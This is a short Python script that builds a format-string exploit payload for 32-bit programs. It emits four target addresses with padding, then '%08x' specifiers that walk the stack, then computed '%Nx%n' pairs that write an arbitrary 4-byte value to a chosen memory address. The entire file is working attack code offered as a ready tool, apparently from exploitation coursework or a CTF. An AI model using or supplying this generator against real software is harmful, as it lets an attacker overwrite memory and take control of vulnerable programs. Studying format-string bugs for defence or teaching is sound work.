#!/usr/bin/env python3

import sys

def help():
    print("Usage: ./{} {{memory address}} {{value to write}} {{offset}}".format(sys.argv[0]))
    print("Address and value format: 0xXXXXXXXX")
    print("Offset - number of octets from $esp to start of buffer")
    exit(1)

def get_address(address):
    return address.to_bytes(4, 'little')

if len(sys.argv) < 4:
    help()

address = int(sys.argv[1], 16)
value = int(sys.argv[2], 16)
offset = int(sys.argv[3])

for i in range(4):
    sys.stdout.buffer.write(get_address(address + i))
    if i < 3:
        sys.stdout.buffer.write(b'PADD')

total = (offset - 1) * 8 + 4 * 7
value = value.to_bytes(4, 'little')

output = ''.join(['%08x' for i in range(offset - 1)])

for byte in value:
    tmp = int(byte) - total
    while(tmp < 8):
        tmp += 256
    output += '%' + str(tmp) + 'x%n'
    total += tmp

print(output, end='')
